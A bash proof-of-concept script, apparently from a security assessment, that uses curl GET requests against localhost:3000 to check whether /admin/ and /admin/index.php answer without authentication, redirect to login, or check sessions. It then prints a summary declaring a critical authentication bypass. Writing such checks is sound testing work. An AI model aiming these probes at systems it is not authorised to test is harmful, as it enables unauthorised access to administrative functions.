#!/bin/bash

# POC: Authentication Bypass - Unrestricted Access to Admin Panel
# This script demonstrates that the /admin/ endpoint is directly accessible
# without any authentication or authorization checks

TARGET="http://localhost:3000"
ADMIN_PATH="/admin/"
ADMIN_INDEX="/admin/index.php"

echo "=========================================="
echo "Authentication Bypass - Admin Panel POC"
echo "=========================================="
echo ""

# Test 1: Access /admin/ without authentication
echo "[*] Test 1: Attempting to access $ADMIN_PATH without authentication..."
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET$ADMIN_PATH")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "[+] HTTP Status Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "[✓] VULNERABLE: /admin/ is accessible without authentication (HTTP 200)"
    echo "[+] Response contains admin content:"
    echo "$BODY" | head -n 20
    echo ""
else
    echo "[-] Not vulnerable or unexpected status: $HTTP_CODE"
fi

echo ""

# Test 2: Access /admin/index.php without authentication
echo "[*] Test 2: Attempting to access $ADMIN_INDEX without authentication..."
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET$ADMIN_INDEX")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "[+] HTTP Status Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "[✓] VULNERABLE: /admin/index.php is accessible without authentication (HTTP 200)"
    echo "[+] Response preview:"
    echo "$BODY" | head -n 20
    echo ""
else
    echo "[-] Not vulnerable or unexpected status: $HTTP_CODE"
fi

echo ""

# Test 3: Verify no redirect to login
echo "[*] Test 3: Checking for authentication redirects..."
RESPONSE=$(curl -s -i "$TARGET$ADMIN_PATH" 2>&1)
if echo "$RESPONSE" | grep -qi "Location.*login"; then
    echo "[-] Application redirects to login page (not vulnerable)"
elif echo "$RESPONSE" | grep -qi "401\|403"; then
    echo "[-] Application returns 401 or 403 (not vulnerable)"
else
    echo "[✓] VULNERABLE: No redirect to login page detected"
    echo "[+] Application does not enforce authentication"
fi

echo ""

# Test 4: Verify no session validation
echo "[*] Test 4: Checking for session validation..."
RESPONSE=$(curl -s "$TARGET$ADMIN_PATH")
if echo "$RESPONSE" | grep -qi "admin"; then
    echo "[✓] VULNERABLE: Admin content served without session validation"
    echo "[+] Endpoint returns admin panel content"
else
    echo "[-] Admin content not found in response"
fi

echo ""
echo "=========================================="
echo "POC SUMMARY"
echo "=========================================="
echo "The /admin/ endpoint is directly accessible without:"
echo "  - Valid user credentials"
echo "  - Active session authentication"
echo "  - Authorization checks"
echo "  - Redirect to login page"
echo ""
echo "This demonstrates a CRITICAL authentication bypass vulnerability."
echo "=========================================="